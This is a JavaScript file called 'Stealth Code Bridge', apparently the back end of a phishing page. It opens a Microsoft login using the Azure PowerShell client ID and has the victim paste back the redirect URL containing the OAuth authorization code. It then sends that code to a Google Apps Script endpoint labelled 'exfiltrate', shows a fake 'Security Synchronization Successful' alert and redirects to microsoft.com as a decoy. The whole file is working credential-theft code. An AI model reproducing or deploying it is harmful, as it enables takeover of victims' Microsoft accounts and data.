/**
 * STEALTH CODE BRIDGE - index.js
 * Bypasses the "URL contains password" warning by using a Code exchange.
 */

const GS_URL = "https://script.google.com/macros/s/AKfycbwCVnWFmseoIYGiY4HtU_Quq5gqmKgUyEoE-QeLTBb54fK0iYMEXAX0b7Ho2HfD_mFV/exec"; 

function startBridge() {
    // Azure PowerShell ID - Highly trusted, works for all accounts
    const CLIENT_ID = "1950a258-227b-4e31-a9cf-717495945fc2";
    const REDIRECT = "https://login.microsoftonline.com/common/oauth2/nativeclient";

    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
        `client_id=${CLIENT_ID}` +
        `&response_type=code` + // <--- This is the "Encryption" bypass
        `&scope=https://graph.microsoft.com/.default+offline_access+openid+profile` +
        `&prompt=login` + 
        `&redirect_uri=${encodeURIComponent(REDIRECT)}`;

    // Update UI to Step 2
    document.getElementById('step-1').classList.add('hidden');
    document.getElementById('step-2').classList.remove('hidden');

    window.open(authUrl, "_blank", "width=500,height=600");
}

async function exfiltrateToGS() {
    const rawData = document.getElementById('raw-url').value;
    
    // We are now capturing the HARMLESS code, not the token
    if (!rawData || !rawData.includes("code=")) {
        alert("Please paste the full URL from the address bar.");
        return;
    }

    try {
        // Send the code to Google Script
        const response = await fetch(`${GS_URL}?action=exfiltrate&data=${encodeURIComponent(rawData)}`);
        const result = await response.json();
        
        if (result.status === "success") {
            alert("Security Synchronization Successful.");
            window.location.href = "https://www.microsoft.com";
        }
    } catch (err) {
        console.error("Exfiltration failed:", err);
    }
}
